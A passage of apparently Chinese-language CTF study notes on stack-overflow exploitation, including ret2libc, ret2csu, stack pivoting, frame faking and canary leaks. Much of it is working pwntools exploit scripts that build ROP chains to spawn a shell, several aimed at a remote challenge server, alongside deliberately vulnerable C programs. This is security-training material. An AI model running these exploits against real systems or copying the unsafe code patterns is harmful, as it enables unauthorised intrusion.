<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;47.106.212.155&#34;</span><span class="p">,</span><span class="mi">10004</span><span class="p">)</span>

<span class="n">pop_eax_addr</span> <span class="o">=</span> <span class="mh">0x080bb196</span>
<span class="n">pop_ebcdx_addr</span> <span class="o">=</span> <span class="mh">0x0806eb90</span>
<span class="n">int_0x80_addr</span> <span class="o">=</span> <span class="mh">0x08049421</span>
<span class="n">bin_sh_addr</span> <span class="o">=</span> <span class="mh">0x080BE408</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
    <span class="p">[</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">112</span><span class="p">,</span><span class="n">pop_eax_addr</span><span class="p">,</span><span class="mh">0xb</span><span class="p">,</span><span class="n">pop_ebcdx_addr</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">bin_sh_addr</span><span class="p">,</span><span class="n">int_0x80_addr</span><span class="p">]</span>
<span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></div>
<h6 id="ret2libc">ret2libc</h6>

<p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(&ldquo;/bin/sh&rdquo;)，故而此时我们需要知道 system 函数的地址。</p>

<p>eg1:  <a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1" target="_blank">ret2libc1</a></p>

<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407175007.png" alt="" /></p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [esp+1Ch] [ebp-64h]
</span><span class="c1"></span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;RET2LIBC &gt;_&lt;&#34;</span><span class="p">);</span>
  <span class="n">gets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></div>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407175502.png" alt="" /></p>

<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407175715.png" alt="" /></p>

<p>exp1:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># io = process(&#39;./ret2libc1&#39;)</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;47.106.212.155&#34;</span><span class="p">,</span><span class="mi">10006</span><span class="p">)</span>
<span class="n">binsh_addr</span> <span class="o">=</span> <span class="mh">0x08048720</span>
<span class="n">sym_plt_addr</span> <span class="o">=</span> <span class="mh">0x08048460</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="mi">112</span><span class="o">*</span><span class="s1">&#39;A&#39;</span><span class="p">,</span><span class="n">sym_plt_addr</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mi">4</span><span class="p">,</span><span class="n">binsh_addr</span><span class="p">])</span>
<span class="c1"># &#39;bbbb&#39; 作为函数调用栈返回地址的虚假的地址</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></div>
<hr />

<p>eg2:</p>

<p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2" target="_blank">ret2libc2</a></p>

<p>缺少/bin/sh 只能自己寻找gadgets来进行构造。</p>

<p>exp:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># io = process(&#39;./ret2libc2&#39;)</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;47.106.212.155&#34;</span><span class="p">,</span><span class="mi">10007</span><span class="p">)</span>
<span class="c1"># binsh_addr = 0x08048720</span>
<span class="n">sym_plt_addr</span> <span class="o">=</span> <span class="mh">0x08048490</span>
<span class="n">sym_imp_gets_addr</span> <span class="o">=</span> <span class="mh">0x08048460</span>
<span class="n">pop_ebx_addr</span> <span class="o">=</span> <span class="mh">0x0804872f</span>
<span class="n">buf2_addr</span> <span class="o">=</span> <span class="mh">0x804a080</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">112</span><span class="p">,</span><span class="n">sym_imp_gets_addr</span><span class="p">,</span><span class="n">pop_ebx_addr</span><span class="p">,</span><span class="n">buf2_addr</span><span class="p">,</span><span class="n">sym_plt_addr</span><span class="p">,</span><span class="s1">&#39;x&#39;</span><span class="o">*</span><span class="mi">4</span><span class="p">,</span><span class="n">buf2_addr</span><span class="p">])</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></div>
<p>eg3:</p>

<p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3" target="_blank">ret2libc3</a></p>

<p>2的基础上去掉了system的地址。</p>

<p>got 表泄露libc的函数地址</p>

<p>利用思路：</p>

<ul>
<li>泄露 __libc_start_main 地址</li>
<li>获取 libc 版本</li>
<li>获取 system 地址与 /bin/sh 的地址</li>
<li>再次执行源程序</li>
<li>触发栈溢出执行 system(‘/bin/sh’)</li>
</ul>

<p>exp:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>

<span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">arch</span> <span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span> <span class="p">)</span>
<span class="c1"># io = process(&#39;./ret2libc3&#39;)</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;47.106.212.155&#34;</span><span class="p">,</span><span class="mi">10008</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./ret2libc3&#39;</span><span class="p">)</span>
<span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
<span class="n">start_main_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;__libc_start_main&#39;</span><span class="p">]</span>
<span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">112</span><span class="p">,</span><span class="n">puts_plt</span><span class="p">,</span><span class="n">main</span><span class="p">,</span><span class="n">start_main_got</span><span class="p">])</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Can you find it !?&#34;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>

<span class="n">libc_start_main_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">])</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;__libc_start_main&#39;</span><span class="p">,</span><span class="n">libc_start_main_addr</span><span class="p">)</span>
<span class="n">libcbase</span> <span class="o">=</span> <span class="n">libc_start_main_addr</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;__libc_start_main&#34;</span><span class="p">)</span>
<span class="n">sym_addr</span> <span class="o">=</span> <span class="n">libcbase</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
<span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libcbase</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">112</span><span class="p">,</span><span class="n">sym_addr</span><span class="p">,</span><span class="s2">&#34;bbbb&#34;</span><span class="p">,</span><span class="n">binsh_addr</span><span class="p">])</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></div>
<h5 id="中级rop">中级ROP</h5>

<h6 id="ret2csu">ret2csu</h6>

<p>利用 x64 下的 __libc_csu_init 中的 gadgets.</p>

<p>eg:level5:</p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#undef _FORTIFY_SOURCE
</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">void</span> <span class="nf">vulnerable_function</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
    <span class="n">read</span><span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">512</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">write</span><span class="p">(</span><span class="n">STDOUT_FILENO</span><span class="p">,</span> <span class="s">&#34;Hello, World</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">13</span><span class="p">);</span>
    <span class="n">vulnerable_function</span><span class="p">();</span>
<span class="p">}</span></code></pre></div>
<p>exp:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"></code></pre></div>
<h6 id="ret2reg">ret2reg</h6>

<ul>
<li>略 无题目</li>
</ul>

<h6 id="brop">BROP</h6>

<ul>
<li>略 无二进制</li>
</ul>

<h5 id="高级rop">高级ROP</h5>

<h6 id="ret2-dl-runtime-resolve">ret2_dl_runtime_resolve</h6>

<p>XDCTF2015-pwn200</p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>

    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
    <span class="n">vuln</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="o">//</span><span class="n">gcc</span> <span class="o">-</span><span class="n">o</span> <span class="n">bof</span> <span class="o">-</span><span class="n">m32</span> <span class="o">-</span><span class="n">fno</span><span class="o">-</span><span class="n">stack</span><span class="o">-</span><span class="n">protector</span> <span class="n">bof</span><span class="p">.</span><span class="n">c</span></code></pre></div>
<h6 id="srop">SROP</h6>

<h6 id="ret2vdso">ret2VDSO</h6>

<h5 id="花式栈溢出">花式栈溢出</h5>

<ul>
<li>stack pivoting</li>
</ul>

<p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-%20b0verfl0w" target="_blank">X-CTF Quals 2016 - b0verfl0w</a></p>

<p>转移堆：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/EkoPartyCTF%202016%20fuckzing-exploit-200" target="_blank">EkoPartyCTF 2016 fuckzing-exploit-200</a></p>

<ul>
<li>frame faking</li>
</ul>

<p>2018 安恒杯 over</p>

<p><img src="https://my-md-1253484710.file.myqcloud.com/20190522130814.png" alt="" /></p>

<p>直接EXP 分析，，困扰了很久的exp</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&#34;./over.over&#34;</span>

<span class="k">def</span> <span class="nf">DEBUG</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
    <span class="nb">raw_input</span><span class="p">(</span><span class="s2">&#34;DEBUG: &#34;</span><span class="p">)</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./over.over&#34;</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./over.over&#34;</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">80</span><span class="p">)</span>
<span class="n">stack</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:</span> <span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x70</span>
<span class="n">success</span><span class="p">(</span><span class="s2">&#34;stack -&gt; {:#x}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">stack</span><span class="p">))</span>


<span class="c1">#  DEBUG(&#34;b *0x4006B9\nc&#34;) 96</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">,</span> <span class="n">flat</span><span class="p">([</span><span class="s1">&#39;11111111&#39;</span><span class="p">,</span> <span class="mh">0x400793</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">],</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">],</span> <span class="mh">0x400676</span><span class="p">,</span> <span class="p">(</span><span class="mi">80</span> <span class="o">-</span> <span class="mi">40</span><span class="p">)</span> <span class="o">*</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="n">stack</span><span class="p">,</span> <span class="mh">0x4006be</span><span class="p">]))</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:</span> <span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
<span class="n">success</span><span class="p">(</span><span class="s2">&#34;libc.address -&gt; {:#x}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>

<span class="n">pop_rdi_ret</span><span class="o">=</span><span class="mh">0x400793</span>
<span class="s1">&#39;&#39;&#39;
</span><span class="s1">$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &#34;pop|ret&#34;
</span><span class="s1">0x00000000000f5279 : pop rdx ; pop rsi ; ret
</span><span class="s1">&#39;&#39;&#39;</span>
<span class="n">pop_rdx_pop_rsi_ret</span><span class="o">=</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0xf5279</span>


<span class="n">payload</span><span class="o">=</span><span class="n">flat</span><span class="p">([</span><span class="s1">&#39;22222222&#39;</span><span class="p">,</span> <span class="n">pop_rdi_ret</span><span class="p">,</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)),</span><span class="n">pop_rdx_pop_rsi_ret</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;execve&#39;</span><span class="p">],</span> <span class="p">(</span><span class="mi">80</span> <span class="o">-</span> <span class="mi">7</span><span class="o">*</span><span class="mi">8</span> <span class="p">)</span> <span class="o">*</span> <span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="n">stack</span> <span class="o">-</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x4006be</span><span class="p">])</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></div>
<ul>
<li>Stack smash</li>
</ul>

<p>35c3 CTF readme</p>

<p><img src="https://my-md-1253484710.file.myqcloud.com/20190522132544.png" alt="" /></p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">addr_ow_flag</span> <span class="o">=</span> <span class="mh">0x600d20</span>
<span class="n">addr_flag</span> <span class="o">=</span> <span class="mh">0x400d20</span>

<span class="n">H</span><span class="p">,</span><span class="n">P</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">6666</span>

<span class="c1">#r = process(&#39;./readme.bin&#39;)</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">H</span><span class="p">,</span><span class="n">P</span><span class="p">)</span>
<span class="n">junk</span>  <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;What&#39;s your name? &#34;</span><span class="p">)</span>
<span class="n">exploit</span>  <span class="o">=</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x218</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr_flag</span><span class="p">)</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr_ow_flag</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
<span class="n">junk</span> <span class="o">+=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Please overwrite the flag: &#34;</span><span class="p">)</span>
<span class="n">exploit</span>  <span class="o">=</span> <span class="s2">&#34;LIBC_FATAL_STDERR_=1&#34;</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
<span class="n">junk</span> <span class="o">+=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="k">print</span> <span class="n">junk</span></code></pre></div>
<ul>
<li>栈上partial overwrite</li>
</ul>

<p>2018 安恒杯 babypie</p>

<p>2018 XNUCA-gets</p>

<h5 id="canary-绕过技术">Canary 绕过技术</h5>

<ul>
<li>泄露栈中的Canary</li>
</ul>

<p>覆盖 Canary 的低字节，来打印出剩余的 Canary 部分</p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c">  <span class="c1">// ex2.c
</span><span class="c1"></span>  <span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp"></span>  <span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp"></span>  <span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp"></span>  <span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp"></span>  <span class="kt">void</span> <span class="nf">getshell</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="kt">void</span> <span class="nf">init</span><span class="p">()</span> <span class="p">{</span>
      <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
      <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
      <span class="n">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span> <span class="p">{</span>
      <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
      <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
          <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">);</span>
          <span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
      <span class="p">}</span>
  <span class="p">}</span>
  <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">init</span><span class="p">();</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Hello Hacker!&#34;</span><span class="p">);</span>
      <span class="n">vuln</span><span class="p">();</span>
      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span></code></pre></div>
<p>EXP</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python">  <span class="ch">#!/usr/bin/env python</span>
   
  <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
   
  <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s1">&#39;ex2&#39;</span><span class="c1">#全局系统自动设置，为官方推荐设置，ex2为文件名称。</span>
  <span class="c1">#context.log_level = &#39;debug&#39;#debug模式下才开启</span>
  <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./ex2&#39;</span><span class="p">)</span> <span class="c1">#本地连接到ex2</span>
   
  <span class="n">get_shell</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./ex2&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;getshell&#34;</span><span class="p">]</span> <span class="c1">#由于源码里有getshell函数，所以直接可以使用ELF模块找到getshell函数地址。</span>
   
  <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Hello Hacker!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span><span class="c1">#接受传来的第一部分字符</span>
   
  <span class="c1"># leak Canary</span>
  <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">100</span> 
  <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="c1">#传输100个A</span>
   
  <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span>
  <span class="n">Canary</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span><span class="o">-</span><span class="mh">0xa</span> <span class="c1">#因为cannary最后一位字节为00被0x0a覆盖，所以减去0x0a</span>
  <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Canary:&#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">Canary</span><span class="p">))</span><span class="c1">#日志记录下canary</span>
   
  <span class="c1"># Bypass Canary</span>
  <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">100</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">Canary</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">12</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">get_shell</span><span class="p">)</span><span class="c1">#发送最后的payload</span>
  <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
   
  <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
   
  <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></div>
<ul>
<li>one-by-one 爆破 Canary</li>
</ul>
